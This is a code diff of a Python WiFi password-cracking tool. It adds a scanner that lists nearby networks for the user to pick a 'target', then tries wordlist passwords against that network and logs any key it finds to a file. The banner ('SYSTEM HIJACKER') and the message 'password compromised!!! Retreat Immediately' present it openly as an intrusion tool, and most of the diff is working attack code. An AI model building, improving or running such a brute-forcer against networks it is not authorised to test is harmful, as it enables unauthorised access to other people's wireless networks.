@@ -9,11 +9,10 @@ from colorama import Fore, Back, Style, init
 init(autoreset=True)
 
 def alert_beep():
-    """Triggers a success sound alert."""
     try:
         if os.name == 'nt':
             import winsound
-            winsound.Beep(1000, 500)  # Frequency: 1000Hz, Duration: 500ms
+            winsound.Beep(1000, 500)
         else:
             sys.stdout.write('\a') 
             sys.stdout.flush()
@@ -21,7 +20,6 @@ def alert_beep():
         pass
 
 def typewriter(text, color_style, speed=0.04):
-    """Creates the slow-typing effect for dramatic updates."""
     for char in text:
         sys.stdout.write(color_style + char)
         sys.stdout.flush()
@@ -42,10 +40,55 @@ def show_banner():
     print(f"{Fore.RED}{Back.BLACK}{Style.BRIGHT} [!] SYSTEM STATUS: HACKER {Fore.WHITE}| {Fore.YELLOW}SYSTEM HIJACKER: ACTIVATED {Fore.RED}[!] ")
     print(f"{Fore.CYAN}{'='*75}\n")
 
+def wifi_scanner(iface):
+    """Continuously updates WiFi list until Ctrl+C."""
+    input(f"{Fore.YELLOW}[>] Press ENTER to start scanning... ")
+    
+    # Store networks outside the loop so they persist
+    found_ssids = []
+    
+    try:
+        while True:
+            iface.scan()
+            time.sleep(1.5) # Wait for hardware response
+            results = iface.scan_results()
+            
+            # Map SSIDs to results to prevent duplicates
+            unique_nets = {res.ssid: res for res in results if res.ssid.strip()}
+            
+            show_banner()
+            print(f"{Fore.WHITE}Scanning... (Press {Fore.RED}Ctrl+C{Fore.WHITE} to stop and select target)\n")
+            print(f"{Fore.CYAN}{'ID':<5} {'BSSID':<20} {'RSSI':<8} {'SSID'}")
+            print(f"{Fore.CYAN}{'-'*60}")
+            
+            temp_list = []
+            for i, (ssid, net) in enumerate(unique_nets.items(), 1):
+                # RSSI formatting (higher is better)
+                rssi_color = Fore.GREEN if net.signal > -60 else Fore.YELLOW if net.signal > -80 else Fore.RED
+                print(f"{Fore.WHITE}{i:<5} {net.bssid:<20} {rssi_color}{net.signal:<8} {Fore.GREEN}{ssid}")
+                temp_list.append(ssid)
+            
+            found_ssids = temp_list # Update our persistent list
+            if not found_ssids:
+                print(f"{Fore.RED}No networks found yet. Searching...")
+            
+            time.sleep(1) # Refresh interval
+            
+    except KeyboardInterrupt:
+        print(f"\n\n{Fore.YELLOW}[*] Scan stopped.")
+        if not found_ssids:
+            print(f"{Fore.RED}[!] No networks were discovered. Exiting.")
+            sys.exit()
+            
+        while True:
+            try:
+                choice = input(f"\n{Fore.CYAN}Select Target ID (1-{len(found_ssids)}): {Fore.WHITE}")
+                return found_ssids[int(choice)-1]
+            except (ValueError, IndexError, KeyboardInterrupt):
+                print(f"{Fore.RED}[!] Invalid selection or user exit.")
+                sys.exit()
+
 def get_protocol_details(iface, target_ssid):
-    iface.scan()
-    typewriter("[*] Identifying target protocol...", Fore.YELLOW, 0.03)
-    time.sleep(3)
     results = iface.scan_results()
     for network in results:
         if network.ssid == target_ssid:
@@ -56,7 +99,7 @@ def get_protocol_details(iface, target_ssid):
                 return "WPA2-PSK", const.AKM_TYPE_WPA2PSK
             if const.AKM_TYPE_WPAPSK in akm:
                 return "WPA-PSK", const.AKM_TYPE_WPAPSK
-    return "UNKNOWN/WPA2", const.AKM_TYPE_WPA2PSK
+    return "WPA2", const.AKM_TYPE_WPA2PSK
 
 def test_wifi(iface, ssid, password, timeout, akm_type):
     iface.disconnect()
@@ -80,20 +123,29 @@ def test_wifi(iface, ssid, password, timeout, akm_type):
 def main():
     try:
         show_banner()
-        ssid = input(f"{Fore.CYAN}1. target ssid: {Fore.WHITE}")
-        wordlist_path = input(f"{Fore.CYAN}2. wordlist path: {Fore.WHITE}")
+        
+        wifi = pywifi.PyWiFi()
+        if not wifi.interfaces():
+            print(f"{Fore.RED}[!] No WiFi interfaces found.")
+            return
+        
+        iface = wifi.interfaces()[0] 
+
+        # Step 1: Scan and Select
+        ssid = wifi_scanner(iface)
+        
+        # Step 2: Config
+        wordlist_path = input(f"\n{Fore.CYAN}1. wordlist path: {Fore.WHITE}")
         try:
-            delay = float(input(f"{Fore.CYAN}3. attempt delay (seconds): {Fore.WHITE}"))
+            delay = float(input(f"{Fore.CYAN}2. attempt delay (seconds): {Fore.WHITE}"))
         except:
             delay = 5.0 
-
-        wifi = pywifi.PyWiFi()
-        iface = wifi.interfaces()[0] 
 
         if not os.path.exists(wordlist_path):
             typewriter(f"\n{Fore.RED}[!] CRITICAL ERROR: WORDLIST NOT FOUND", Fore.RED, 0.05)
             return
 
+        typewriter(f"[*] Analyzing target: {ssid}...", Fore.YELLOW, 0.03)
         proto_name, akm_type = get_protocol_details(iface, ssid)
         typewriter(f"[+] Protocol Detected: {proto_name}", Fore.GREEN, 0.03)
 
@@ -106,20 +158,18 @@ def main():
 
         for i, pwd in enumerate(passwords, 1):
             if len(pwd) < 8:
-                sys.stdout.write(f"\r{Fore.RED}skipping (short) {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}{' '*15}")
+                sys.stdout.write(f"\r{Fore.RED}skipping (short) {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}")
                 sys.stdout.flush()
                 continue
 
-            sys.stdout.write(f"\r{Fore.YELLOW}testing {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}{' '*15}")
+            sys.stdout.write(f"\r{Fore.YELLOW}testing {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}")
             sys.stdout.flush()
 
             if test_wifi(iface, ssid, pwd, delay, akm_type):
-                # SUCCESS SEQUENCE WITH FULL TYPEWRITER EFFECT
                 alert_beep()
                 print("\n")
                 typewriter(f"Success! :({pwd})", Fore.GREEN + Style.BRIGHT, 0.06)
-                typewriter("password compromised !!!", Fore.RED + Style.BRIGHT, 0.08)
-                typewriter("Re-treat immediately", Fore.RED + Style.BRIGHT, 0.08)
+                typewriter("password compromised!!! Retreat Immediately", Fore.RED + Style.BRIGHT, 0.08)
                 
                 with open("cracked_passwords.txt", "a") as log:
                     log.write(f"DATE: {time.ctime()} | SSID: {ssid} | KEY: {pwd}\n")
@@ -130,7 +180,7 @@ def main():
 
     except KeyboardInterrupt:
         print("\n")
-        typewriter("It's not me!", Fore.RED + Style.BRIGHT, 0.08)
+        typewriter("Operation Aborted.", Fore.RED + Style.BRIGHT, 0.08)
         sys.exit()
 
 if __name__ == "__main__":
